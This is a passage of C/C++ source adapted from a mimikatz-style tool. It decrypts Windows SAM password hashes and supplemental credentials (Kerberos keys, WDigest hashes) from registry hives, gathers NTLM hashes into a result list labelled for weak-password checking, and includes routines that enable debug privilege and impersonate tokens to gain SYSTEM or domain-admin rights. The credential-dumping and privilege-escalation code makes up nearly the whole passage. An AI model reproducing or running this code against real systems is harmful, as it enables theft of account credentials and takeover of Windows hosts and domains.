                cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
                if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
                {
                    RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
                    if (!(status = NT_SUCCESS(RtlDecryptData2(&cypheredHashBuffer, &keyBuffer))))
                        LOG_ERROR("error! %lu", GetLastError());
                }
            }
            break;
        case 2:
            pHashAes = (PSAM_HASH_AES)pHash;
            if (pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
            {
                if (ai_s_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
                {
                    cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
                    if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
                    {
                        RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
                        status = TRUE;
                    }
                    LocalFree(out);
                }
            }
            break;
        default:
            LOG_ERROR("error (%hu)", pHash->Revision);
        }
        if (status)
            ai_s_wpdump_dcsync_decrypt((PBYTE)cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM") : (isHistory ? L"lm  " : L"LM  "), isHistory);
        if (cypheredHashBuffer.Buffer)
            LocalFree(cypheredHashBuffer.Buffer);
    }
    return status;
}


BOOL ai_s_wpdump_getSupplementalCreds(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hUser, IN const BYTE samKey[SAM_KEY_DATA_KEY_LENGTH])
{
    BOOL status = FALSE;
    PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS pEncCreds;
    DWORD szNeeded = 0;
    PUSER_PROPERTIES properties;
    LPVOID data;

    if (ai_s_wpreg_RegQueryValueEx(hRegistry, hUser, L"SupplementalCredentials", NULL, NULL, NULL, &szNeeded))
    {
        if (szNeeded > (FIELD_OFFSET(KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted) + AES_BLOCK_SIZE + 96)) //header + block + padding in Reserved4
        {
            if (pEncCreds = (PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS)LocalAlloc(LPTR, szNeeded))
            {
                if (ai_s_wpreg_RegQueryValueEx(hRegistry, hUser, L"SupplementalCredentials", NULL, NULL, (LPBYTE)pEncCreds, &szNeeded))
                {
                    //kprintf(L"\nSupplemental Credentials:\n");
                    if (properties = (PUSER_PROPERTIES)LocalAlloc(LPTR, FIELD_OFFSET(USER_PROPERTIES, Reserved4) + pEncCreds->originalSize))
                    {
                        if (ai_s_crypto_genericAES128Decrypt(samKey, pEncCreds->iv, pEncCreds->encrypted, szNeeded - FIELD_OFFSET(KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted), &data, &properties->Length))
                        {
                            if (properties->Length == pEncCreds->originalSize)
                            {
                                status = TRUE;
                                RtlCopyMemory(properties->Reserved4, data, properties->Length);
                                ai_s_wpdump_dcsync_descrUserProperties(properties);
                            }
                            LocalFree(data);
                        }
                        LocalFree(properties);
                    }
                }
                else
                    LOG_ERROR("error! %lu", GetLastError());
                LocalFree(pEncCreds);
            }
        }
    }
    return status;
}

wchar_t* ai_s_string_qad_ansi_c_to_unicode(const char* ansi, SIZE_T szStr)
{
    wchar_t* buffer = NULL;
    SIZE_T i;

    if (ansi && szStr)
        if (buffer = (wchar_t*)LocalAlloc(LPTR, (szStr + 1) * sizeof(wchar_t)))
            for (i = 0; i < szStr; i++)
                buffer[i] = ansi[i];
    return buffer;
}

BOOL ai_s_wpreg_RegQueryValueEx(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName, IN LPDWORD lpReserved, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPBYTE lpData, IN OUT OPTIONAL LPDWORD lpcbData)
{
    BOOL status = FALSE;
    DWORD dwErrCode, szData;
    PAI_S_WPREG_HIVE_VALUE_KEY pFvk = NULL;
    PVOID dataLoc;

    switch (hRegistry->type)
    {
    case AI_S_WPREG_TYPE_OWN:
        dwErrCode = RegQueryValueEx(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
        if (!(status = (dwErrCode == ERROR_SUCCESS)))
            SetLastError(dwErrCode);
        break;
    case AI_S_WPREG_TYPE_HIVE:
        pFvk = ai_s_wpreg_searchValueNameInList(hRegistry, hKey, lpValueName);
        if (status = (pFvk != NULL))
        {
            szData = pFvk->szData & ~0x80000000;
            if (lpType)
                *lpType = pFvk->typeData;

            if (lpcbData)
            {
                if (lpData)
                {
                    if (status = (*lpcbData >= szData))
                    {
                        dataLoc = (pFvk->szData & 0x80000000) ? &pFvk->offsetData : (PVOID) & (((PAI_S_WPREG_HIVE_BIN_CELL)(hRegistry->pHandleHive->pStartOf + pFvk->offsetData))->data);
                        RtlCopyMemory(lpData, dataLoc, szData);
                    }
                }
                *lpcbData = szData;
            }
        }
        break;
    default:
        break;
    }
    return status;
}

PAI_S_WPREG_HIVE_VALUE_KEY ai_s_wpreg_searchValueNameInList(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName)
{
    PAI_S_WPREG_HIVE_KEY_NAMED pKn;
    PAI_S_WPREG_HIVE_VALUE_LIST pVl;
    PAI_S_WPREG_HIVE_VALUE_KEY pVk, pFvk = NULL;
    DWORD i;
    wchar_t* buffer;

    pKn = hKey ? (PAI_S_WPREG_HIVE_KEY_NAMED)hKey : hRegistry->pHandleHive->pRootNamedKey;
    if (pKn->tag == 'kn')
    {
        if (pKn->nbValues && (pKn->offsetValues != -1))
        {
            pVl = (PAI_S_WPREG_HIVE_VALUE_LIST)(hRegistry->pHandleHive->pStartOf + pKn->offsetValues);
            for (i = 0; i < pKn->nbValues && !pFvk; i++)
            {
                pVk = (PAI_S_WPREG_HIVE_VALUE_KEY)(hRegistry->pHandleHive->pStartOf + pVl->offsetValue[i]);
                if (pVk->tag == 'kv')
                {
                    if (lpValueName)
                    {
                        if (pVk->szValueName)
                        {
                            if (pVk->flags & AI_S_WPREG_HIVE_VALUE_KEY_FLAG_ASCII_NAME)
                                buffer = ai_s_string_qad_ansi_c_to_unicode((char*)pVk->valueName, pVk->szValueName);
                            else if (buffer = (wchar_t*)LocalAlloc(LPTR, pVk->szValueName + sizeof(wchar_t)))
                                RtlCopyMemory(buffer, pVk->valueName, pVk->szValueName);

                            if (buffer)
                            {
                                if (_wcsicmp(lpValueName, buffer) == 0)
                                    pFvk = pVk;
                                LocalFree(buffer);
                            }
                        }
                    }
                    else if (!pVk->szValueName)
                        pFvk = pVk;
                }
            }
        }
    }
    return pFvk;
}

BOOL ai_s_crypto_genericAES128Decrypt(LPCVOID pKey, LPCVOID pIV, LPCVOID pData, DWORD dwDataLen, LPVOID* pOut, DWORD* dwOutLen)
{
    BOOL status = FALSE;
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    DWORD mode = CRYPT_MODE_CBC;

    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        if (ai_s_crypto_hkey(hProv, CALG_AES_128, pKey, 16, 0, &hKey, NULL))
        {
            if (CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE)&mode, 0))
            {
                if (CryptSetKeyParam(hKey, KP_IV, (LPCBYTE)pIV, 0))
                {
                    if (*pOut = LocalAlloc(LPTR, dwDataLen))
                    {
                        *dwOutLen = dwDataLen;
                        RtlCopyMemory(*pOut, pData, dwDataLen);
                        if (!(status = CryptDecrypt(hKey, 0, TRUE, 0, (PBYTE)*pOut, dwOutLen)))
                        {
                            LOG_ERROR("error! %lu", GetLastError());
                            *pOut = LocalFree(*pOut);
                            *dwOutLen = 0;
                        }
                    }
                }
                else
                    LOG_ERROR("error! %lu", GetLastError());
            }
            else
                LOG_ERROR("error! %lu", GetLastError());
            CryptDestroyKey(hKey);
        }
        else
            LOG_ERROR("error! %lu", GetLastError());
        CryptReleaseContext(hProv, 0);
    }
    else
        LOG_ERROR("error! %lu", GetLastError());
    return status;
}

BOOL ai_s_wpdump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
    DWORD i;
    BOOL status = FALSE;
    BYTE data[LM_NTLM_HASH_LENGTH];

    for (i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
    {
        status = NT_SUCCESS(RtlDecryptNtOwfPwdWithIndex(encodedData + i, &rid, data)); // same as RtlDecryptLmOwfPwdWithIndex for LM hash
        if (status)
        {
            //if (isHistory)
            //    kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
            //else
            //    kprintf(L"  Hash %s: ", prefix);

            //if ((StrCmpW(prefix, L"ntlm") == 0 || StrCmpW(prefix, L"NTLM") == 0) && (!isHistory))
            if ((std::wstring(prefix) == L"ntlm" || std::wstring(prefix) == L"NTLM") && (!isHistory))
            {
                DolphinCoreWorker_AddHash(data);
            }

            //ai_s_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
            //kprintf(L"\n");
        }
        else
            LOG_ERROR("error! %lu", GetLastError());
    }
    return status;
}

DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
void ai_s_wpdump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
{
    DWORD i, j, k, szData;
    PUSER_PROPERTY property;
    PBYTE data;
    UNICODE_STRING Name;
    LPSTR value;

    PWDIGEST_CREDENTIALS pWDigest;
    PKERB_STORED_CREDENTIAL pKerb;
    PKERB_KEY_DATA pKeyData;
    PKERB_STORED_CREDENTIAL_NEW pKerbNew;
    PKERB_KEY_DATA_NEW pKeyDataNew;

    if (properties->Length > (FIELD_OFFSET(USER_PROPERTIES, PropertyCount) - FIELD_OFFSET(USER_PROPERTIES, Reserved4)))
    {
        if ((properties->PropertySignature == L'P') && properties->PropertyCount)
        {
            for (i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY)((PBYTE)property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
            {
                Name.Length = Name.MaximumLength = property->NameLength;
                Name.Buffer = property->PropertyName;

                value = (LPSTR)((LPCBYTE)property->PropertyName + property->NameLength);
                szData = property->ValueLength / 2;

                //kprintf(L"* %wZ *\n", &Name);
                if (data = (PBYTE)LocalAlloc(LPTR, szData))
                {
                    for (j = 0; j < szData; j++)
                    {
                        sscanf_s(&value[j * 2], "%02x", &k);
                        data[j] = (BYTE)k;
                    }

                    if (RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
                    {
                        //kprintf(L"    %.*s\n", szData / sizeof(wchar_t), (PWSTR)data);
                    }
                    else if (RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
                    {
                        pWDigest = (PWDIGEST_CREDENTIALS)data;
                        for (j = 0; j < pWDigest->NumberOfHashes; j++)
                        {
                            //kprintf(L"    %02u  ", j + 1);
                            //ai_s_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
                            //kprintf(L"\n");
                        }
                    }
                    else if (RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
                    {
                        pKerb = (PKERB_STORED_CREDENTIAL)data;
                        //kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR)((PBYTE)pKerb + pKerb->DefaultSaltOffset));
                        pKeyData = (PKERB_KEY_DATA)((PBYTE)pKerb + sizeof(KERB_STORED_CREDENTIAL));
                        pKeyData = ai_s_wpdump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
                        ai_s_wpdump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
                    }
                    else if (RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
                    {
                        pKerbNew = (PKERB_STORED_CREDENTIAL_NEW)data;
                        //kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PWSTR)((PBYTE)pKerbNew + pKerbNew->DefaultSaltOffset), pKerbNew->DefaultIterationCount);
                        pKeyDataNew = (PKERB_KEY_DATA_NEW)((PBYTE)pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
                        pKeyDataNew = ai_s_wpdump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
                        pKeyDataNew = ai_s_wpdump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
                        pKeyDataNew = ai_s_wpdump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
                        ai_s_wpdump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
                    }
                    else if (RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
                    {
                        //kprintf(L"    Random Value : ");
                        //ai_s_string_wprintf_hex(data, szData, 0);
                        //kprintf(L"\n");
                    }
                    else
                    {
                        //kprintf(L"    Unknown data : ");
                        //ai_s_string_wprintf_hex(data, szData, 1);
                        //kprintf(L"\n");
                    }
                    //kprintf(L"\n");
                    LocalFree(data);
                }
            }
        }
    }
}

BOOL ai_s_crypto_hkey(HCRYPTPROV hProv, ALG_ID calgid, LPCVOID key, DWORD keyLen, DWORD flags, HCRYPTKEY* hKey, HCRYPTPROV* hSessionProv)
{
    BOOL status = FALSE;
    PGENERICKEY_BLOB keyBlob;
    DWORD szBlob = sizeof(GENERICKEY_BLOB) + keyLen;

    if (calgid != CALG_3DES)
    {
        if (keyBlob = (PGENERICKEY_BLOB)LocalAlloc(LPTR, szBlob))
        {
            keyBlob->Header.bType = PLAINTEXTKEYBLOB;
            keyBlob->Header.bVersion = CUR_BLOB_VERSION;
            keyBlob->Header.reserved = 0;
            keyBlob->Header.aiKeyAlg = calgid;
            keyBlob->dwKeyLen = keyLen;
            RtlCopyMemory((PBYTE)keyBlob + sizeof(GENERICKEY_BLOB), key, keyBlob->dwKeyLen);
            status = CryptImportKey(hProv, (LPCBYTE)keyBlob, szBlob, 0, flags, hKey);
            LocalFree(keyBlob);
        }
    }
    else if (hSessionProv)
        status = ai_s_crypto_hkey_session(calgid, key, keyLen, flags, hKey, hSessionProv);

    return status;
}

PKERB_KEY_DATA ai_s_wpdump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
{
    //USHORT i;
    //if (Count)
    //{
    //    if (title)
    //        kprintf(L"    %s\n", title);
    //    for (i = 0; i < Count; i++)
    //    {
    //        kprintf(L"      %s : ", ai_s_kerberos_ticket_etype(keys[i].KeyType));
    //        ai_s_string_wprintf_hex((PBYTE)base + keys[i].KeyOffset, keys[i].KeyLength, 0);
    //        kprintf(L"\n");
    //    }
    //}
    return (PKERB_KEY_DATA)((PBYTE)keys + Count * sizeof(KERB_KEY_DATA));
}

PKERB_KEY_DATA_NEW ai_s_wpdump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
{
    //USHORT i;
    //if (Count)
    //{
    //    if (title)
    //        kprintf(L"    %s\n", title);
    //    for (i = 0; i < Count; i++)
    //    {
    //        kprintf(L"      %s (%u) : ", ai_s_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
    //        ai_s_string_wprintf_hex((PBYTE)base + keys[i].KeyOffset, keys[i].KeyLength, 0);
    //        kprintf(L"\n");
    //    }
    //}
    return (PKERB_KEY_DATA_NEW)((PBYTE)keys + Count * sizeof(KERB_KEY_DATA_NEW));
}

BOOL ai_s_crypto_hkey_session(ALG_ID calgid, LPCVOID key, DWORD keyLen, DWORD flags, HCRYPTKEY* hSessionKey, HCRYPTPROV* hSessionProv)
{
    BOOL status = FALSE;
    PBYTE keyblob, pbSessionBlob, ptr;
    DWORD dwkeyblob, dwLen, i;
    PWSTR container;
    HCRYPTKEY hPrivateKey;

    if (container = ai_s_string_getRandomGUID())
    {
        if (CryptAcquireContext(hSessionProv, container, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET))
        {
            hPrivateKey = 0;
            if (CryptGenKey(*hSessionProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE | (RSA1024BIT_KEY / 2), &hPrivateKey)) // 1024
            {
                if (CryptExportKey(hPrivateKey, 0, PRIVATEKEYBLOB, 0, NULL, &dwkeyblob))
                {
                    if (keyblob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
                    {
                        if (CryptExportKey(hPrivateKey, 0, PRIVATEKEYBLOB, 0, keyblob, &dwkeyblob))
                        {
                            CryptDestroyKey(hPrivateKey);
                            hPrivateKey = 0;

                            dwLen = ((RSAPUBKEY*)(keyblob + sizeof(PUBLICKEYSTRUC)))->bitlen / 8;
                            ((RSAPUBKEY*)(keyblob + sizeof(PUBLICKEYSTRUC)))->pubexp = 1;
                            ptr = keyblob + sizeof(PUBLICKEYSTRUC) + sizeof(RSAPUBKEY);

                            ptr += 2 * dwLen; // Skip pubexp, modulus, prime1, prime2
                            *ptr = 1; // Convert exponent1 to 1
                            RtlZeroMemory(ptr + 1, dwLen / 2 - 1);
                            ptr += dwLen / 2; // Skip exponent1
                            *ptr = 1; // Convert exponent2 to 1
                            RtlZeroMemory(ptr + 1, dwLen / 2 - 1);
                            ptr += dwLen; // Skip exponent2, coefficient
                            *ptr = 1; // Convert privateExponent to 1
                            RtlZeroMemory(ptr + 1, (dwLen / 2) - 1);

                            if (CryptImportKey(*hSessionProv, keyblob, dwkeyblob, 0, 0, &hPrivateKey))
                            {
                                dwkeyblob = (1024 / 2 / 8) + sizeof(ALG_ID) + sizeof(BLOBHEADER); // 1024
                                if (pbSessionBlob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
                                {
                                    ((BLOBHEADER*)pbSessionBlob)->bType = SIMPLEBLOB;
                                    ((BLOBHEADER*)pbSessionBlob)->bVersion = CUR_BLOB_VERSION;
                                    ((BLOBHEADER*)pbSessionBlob)->reserved = 0;
                                    ((BLOBHEADER*)pbSessionBlob)->aiKeyAlg = calgid;
                                    ptr = pbSessionBlob + sizeof(BLOBHEADER);
                                    *(ALG_ID*)ptr = CALG_RSA_KEYX;
                                    ptr += sizeof(ALG_ID);

                                    for (i = 0; i < keyLen; i++)
                                        ptr[i] = ((LPCBYTE)key)[keyLen - i - 1];
                                    ptr += (keyLen + 1);
                                    for (i = 0; i < dwkeyblob - (sizeof(ALG_ID) + sizeof(BLOBHEADER) + keyLen + 3); i++)
                                        if (ptr[i] == 0) ptr[i] = 0x42;
                                    pbSessionBlob[dwkeyblob - 2] = 2;

                                    status = CryptImportKey(*hSessionProv, pbSessionBlob, dwkeyblob, hPrivateKey, flags, hSessionKey);
                                    LocalFree(pbSessionBlob);
                                }
                            }
                        }
                        LocalFree(keyblob);
                    }
                }
            }
            if (hPrivateKey)
                CryptDestroyKey(hPrivateKey);
            if (!status)
                ai_s_crypto_close_hprov_delete_container(*hSessionProv);
        }
        LocalFree(container);
    }
    return status;
}

#if !defined(WPCORE_W2000_SUPPORT)
PWSTR ai_s_string_getRandomGUID()
{
    UNICODE_STRING uString;
    GUID guid;
    PWSTR buffer = NULL;
    if (NT_SUCCESS(UuidCreate(&guid)))
    {
        if (NT_SUCCESS(RtlStringFromGUID(&guid, &uString)))
        {
            if (buffer = (PWSTR)LocalAlloc(LPTR, uString.MaximumLength))
                RtlCopyMemory(buffer, uString.Buffer, uString.MaximumLength);
            RtlFreeUnicodeString(&uString);
        }
    }
    return buffer;
}
#endif

BOOL ai_s_crypto_close_hprov_delete_container(HCRYPTPROV hProv)
{
    BOOL status = FALSE;
    DWORD provtype;
    PSTR container, provider;
    if (ai_s_crypto_CryptGetProvParam(hProv, PP_CONTAINER, FALSE, (PBYTE*)&container, NULL, NULL))
    {
        if (ai_s_crypto_CryptGetProvParam(hProv, PP_NAME, FALSE, (PBYTE*)&provider, NULL, NULL))
        {
            if (ai_s_crypto_CryptGetProvParam(hProv, PP_PROVTYPE, FALSE, NULL, NULL, &provtype))
            {
                CryptReleaseContext(hProv, 0);
                status = CryptAcquireContextA(&hProv, container, provider, provtype, CRYPT_DELETEKEYSET);
            }
            LocalFree(provider);
        }
        LocalFree(container);
    }
    if (!status)
        LOG_ERROR("error! %lu", GetLastError());
    return status;
}

BOOL ai_s_crypto_CryptGetProvParam(HCRYPTPROV hProv, DWORD dwParam, BOOL withError, PBYTE* data, OPTIONAL DWORD* cbData, OPTIONAL DWORD* simpleDWORD)
{
    BOOL status = FALSE;
    DWORD dwSizeNeeded;

    if (simpleDWORD)
    {
        dwSizeNeeded = sizeof(DWORD);
        if (CryptGetProvParam(hProv, dwParam, (BYTE*)simpleDWORD, &dwSizeNeeded, 0))
            status = TRUE;
        else if (withError) LOG_ERROR("error!");
    }
    else
    {
        if (CryptGetProvParam(hProv, dwParam, NULL, &dwSizeNeeded, 0))
        {
            if (*data = (PBYTE)LocalAlloc(LPTR, dwSizeNeeded))
            {
                if (CryptGetProvParam(hProv, dwParam, *data, &dwSizeNeeded, 0))
                {
                    if (cbData)
                        *cbData = dwSizeNeeded;
                    status = TRUE;
                }
                else
                {
                    if (withError)
                        LOG_ERROR("error!");
                    *data = (PBYTE)LocalFree(*data);
                }
            }
        }
        else if (withError) LOG_ERROR("error!");
    }
    return status;
}


//##################### 弱口令添加 #####################
//全局用戶密碼列表
USER_PWD_RESULT* g_USER_PWD_RESULT = NULL;
BOOL DolphinCoreWorker_AddUser(const wchar_t* szUserName)
{
    struct _USER_PWD_RESULT* pLast = NULL;
    struct _USER_PWD_RESULT* pTmp = NULL;

    if (g_USER_PWD_RESULT == NULL)
    {
        g_USER_PWD_RESULT = (USER_PWD_RESULT*)malloc(sizeof(USER_PWD_RESULT));
        if (g_USER_PWD_RESULT == NULL)
        {
            return FALSE;
        }
        memset(g_USER_PWD_RESULT, 0, sizeof(USER_PWD_RESULT));
        _snwprintf_s(g_USER_PWD_RESULT->stData.user_name, MAX_USER_NAME_SIZE, L"%s", szUserName);
    }
    else
    {
        //找到最后一个节点
        pLast = g_USER_PWD_RESULT;
        while (pLast->pNext != NULL)
        {
            pLast = pLast->pNext;
        }

        pTmp = (USER_PWD_RESULT*)malloc(sizeof(USER_PWD_RESULT));
        if (pTmp == NULL)
        {
            return FALSE;
        }
        memset(pTmp, 0, sizeof(USER_PWD_RESULT));
        _snwprintf_s(pTmp->stData.user_name, MAX_USER_NAME_SIZE, L"%s", szUserName);
        pLast->pNext = pTmp;
    }

    return TRUE;
}

BOOL DolphinCoreWorker_AddHash(const BYTE byte_hash[LM_NTLM_HASH_LENGTH])
{
    int size;
    int i;
    struct _USER_PWD_RESULT* pLast = NULL;
    pLast = g_USER_PWD_RESULT;
    if (pLast == NULL)
    {
        return FALSE;
    }

    size = sizeof(pLast->stData.pwd_hash) / sizeof(wchar_t);
    if (size != (LM_NTLM_HASH_LENGTH * 2 + 1))
    {
        return FALSE;
    }

    while (pLast->pNext != NULL)
    {
        pLast = pLast->pNext;
    }

    memset(pLast->stData.pwd_hash, 0, size);
    for (i = 0; i < LM_NTLM_HASH_LENGTH; i++)
    {
        _snwprintf_s(pLast->stData.pwd_hash, size, size - 1,
                     L"%s%02x", pLast->stData.pwd_hash, byte_hash[i] & 0xff);
    }

    return TRUE;
}

const USER_PWD_RESULT* DolphinCoreWorker_GetResult()
{
    return g_USER_PWD_RESULT;
}

void DolphinCoreWorker_FreeResult()
{
    while (g_USER_PWD_RESULT != NULL)
    {
        struct _USER_PWD_RESULT* pHeadNext = g_USER_PWD_RESULT->pNext;
        free(g_USER_PWD_RESULT);
        g_USER_PWD_RESULT = pHeadNext;
    }
}

// ######################提权添加######################
NTSTATUS ai_s_privilege_debug()
{
    return ai_s_privilege_simple(SE_DEBUG);
}

NTSTATUS ai_s_privilege_simple(ULONG privId)
{
    ULONG previousState;
    NTSTATUS status = RtlAdjustPrivilege(privId, TRUE, FALSE, &previousState);
    if (NT_SUCCESS(status))
        LOGW_DEBUG(L"Privilege \'%lu\' OK!", privId);
    else
        LOGW_ERROR(L"Privilege (%lu) error, %08x, %lu", privId, status, GetLastError());
    return status;
}

NTSTATUS ai_s_token_elevate_system()
{
    return ai_s_token_list_or_elevate(0, NULL, TRUE, FALSE);
}

NTSTATUS ai_s_token_list_or_elevate(int argc, const wchar_t* argv[], BOOL elevate, BOOL runIt)
{
    AI_S_TOKEN_ELEVATE_DATA pData = {NULL, NULL, 0, elevate, runIt, NULL, FALSE};
    WELL_KNOWN_SID_TYPE type        = WinNullSid;
    PWSTR name, domain;
    PCWSTR strTokenId;
    PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;

    if (runIt)
        ai_s_string_args_byName(argc, argv, L"process", &pData.pCommandLine, L"whoami.exe");
    ai_s_string_args_byName(argc, argv, L"user", &pData.pUsername, NULL);

    if (ai_s_string_args_byName(argc, argv, L"id", &strTokenId, NULL))
    {
        pData.tokenId = wcstoul(strTokenId, NULL, 0);
    }
    else if (ai_s_string_args_byName(argc, argv, L"domainadmin", NULL, NULL))
        type = WinAccountDomainAdminsSid;
    else if (ai_s_string_args_byName(argc, argv, L"enterpriseadmin", NULL, NULL))
        type = WinAccountEnterpriseAdminsSid;
    else if (ai_s_string_args_byName(argc, argv, L"admin", NULL, NULL))
        type = WinBuiltinAdministratorsSid;
    else if (ai_s_string_args_byName(argc, argv, L"localservice", NULL, NULL))
    {
        type                  = WinLocalServiceSid;
        pData.isSidDirectUser = TRUE;
    }
    else if (ai_s_string_args_byName(argc, argv, L"networkservice", NULL, NULL))
    {
        type                  = WinNetworkServiceSid;
        pData.isSidDirectUser = TRUE;
    }
    else if ((elevate && !pData.pUsername) || ai_s_string_args_byName(argc, argv, L"system", NULL, NULL))
    {
        type = WinLocalSystemSid;
        if (pData.pUsername)
        {
            LOGW_ERROR(L"No username available when SYSTEM");
            pData.pUsername = NULL;
        }
    }

    if ((type == WinAccountDomainAdminsSid) || (type == WinAccountEnterpriseAdminsSid))
        if (!ai_s_net_getCurrentDomainInfo(&pDomainInfo))
            LOGW_ERROR(L"kull_m_local_domain_user_getCurrentDomainSID, %lu", GetLastError());

    if (!elevate || !runIt || pData.tokenId || type || pData.pUsername)
    {
        LOGW_DEBUG(L"Token Id  :%u, User name : %s", pData.tokenId, pData.pUsername ? pData.pUsername : L"");
        if (type)
        {
            if (ai_s_net_CreateWellKnownSid(type, pDomainInfo ? pDomainInfo->Sid : NULL, &pData.pSid))
            {
                if (ai_s_token_getNameDomainFromSID(pData.pSid, &name, &domain, NULL, NULL))
                {
                    LOGW_DEBUG(L"domain\\name:%s\\%s", domain, name);
                    LocalFree(name);
                    LocalFree(domain);
                }
                else
                    LOGW_ERROR(L"kull_m_token_getNameDomainFromSID error! %lu", GetLastError());
            }
            else
                LOGW_ERROR(L"kull_m_local_domain_user_CreateWellKnownSid  error! %lu", GetLastError());
        }
        else
            LOGW_ERROR(L"type:%u error", type);

        if (!elevate || !runIt || pData.tokenId || pData.pSid || pData.pUsername)
        {
            //ai_s_token_getTokensUnique(ai_s_token_list_or_elevate_callback, &pData);
            ai_s_token_getTokens(ai_s_token_list_or_elevate_callback, &pData);
        }

        if (pData.pSid)
            LocalFree(pData.pSid);
        if (pDomainInfo)
            LsaFreeMemory(pDomainInfo);
    }
    return STATUS_SUCCESS;
}

BOOL ai_s_string_args_byName(const int argc, const wchar_t* argv[], const wchar_t* name, const wchar_t** theArgs,
                               const wchar_t* defaultValue)
{
    BOOL result = FALSE;
    const wchar_t *pArgName, *pSeparator;
    SIZE_T argLen, nameLen = wcslen(name);
    int i;
    for (i = 0; i < argc; i++)
    {
        if ((wcslen(argv[i]) > 1) && ((argv[i][0] == L'/') || (argv[i][0] == L'-')))
        {
            pArgName = argv[i] + 1;
            if (!(pSeparator = wcschr(argv[i], L':')))
                pSeparator = wcschr(argv[i], L'=');

            argLen = (pSeparator) ? (pSeparator - pArgName) : wcslen(pArgName);
            if ((argLen == nameLen) && _wcsnicmp(name, pArgName, argLen) == 0)
            {
                if (theArgs)
                {
                    if (pSeparator)
                    {
                        *theArgs = pSeparator + 1;
                        result   = *theArgs[0] != L'\0';
                    }
                }
                else
                    result = TRUE;
                break;
            }
        }
    }
    if (!result && theArgs)
    {
        if (defaultValue)
        {
            *theArgs = defaultValue;
            result   = TRUE;
        }
        else
            *theArgs = NULL;
    }
    return result;
}

BOOL ai_s_net_getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
{
    BOOL status = FALSE;
    LSA_HANDLE hLSA;
    LSA_OBJECT_ATTRIBUTES oaLsa = {0};

    if (NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
    {
